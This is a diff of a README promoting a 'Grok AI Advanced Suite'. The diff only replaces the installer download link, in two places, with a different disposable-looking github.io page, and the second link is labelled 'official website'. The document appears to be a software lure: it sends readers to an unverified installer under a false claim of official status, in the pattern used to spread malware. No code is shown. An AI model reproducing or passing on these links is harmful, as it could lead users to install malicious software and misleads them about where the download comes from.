@@ -2,7 +2,7 @@
 
 Discover the Grok AI Advanced Suite, a comprehensive toolset designed to enhance your experience with Grok and xAI technologies. This suite provides seamless access to advanced AI features and utilities, making it easier to leverage the power of Grok for various applications, from creative tasks to productivity enhancements. Whether you're a developer, researcher, or AI enthusiast, this suite offers everything you need to unlock the full potential of Grok in 2026 and beyond.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -73,7 +73,7 @@ A: The suite may collect usage data to improve functionality and user experience
 
 For the latest version and more information, please visit the official download page. We recommend always downloading from trusted sources to ensure safety and authenticity.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This suite is free to use and regularly updated to ensure compatibility with the latest Grok features. Join our community to stay informed about updates, tips, and best practices for using the Grok AI Advanced Suite effectively.
 
